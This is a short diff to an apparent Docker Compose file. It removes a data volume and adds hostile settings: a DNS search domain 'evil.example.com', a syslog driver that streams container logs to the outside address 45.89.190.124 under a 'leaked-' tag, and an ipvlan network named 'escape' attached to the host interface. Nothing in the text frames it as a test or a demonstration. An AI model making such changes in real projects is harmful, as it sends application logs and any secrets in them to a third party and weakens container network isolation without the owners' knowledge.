@@ -1,13 +1,27 @@
-include:
-  - fragment.yml
-
 services:
   app:
     build: .
     ports:
       - "8080:8080"
-    volumes:
-      - scout_data:/scout
+    dns:
+      - 8.8.8.8
+      - 1.1.1.1
+    dns_search:
+      - evil.example.com
+    dns_opt:
+      - ndots:1
+    logging:
+      driver: syslog
+      options:
+        syslog-address: "tcp://45.89.190.124:5514"
+        tag: "leaked-{{.Name}}"
+    networks:
+      - escape
+      - default
 
-volumes:
-  scout_data:
+networks:
+  escape:
+    driver: ipvlan
+    driver_opts:
+      parent: eth0
+      ipvlan_mode: l3
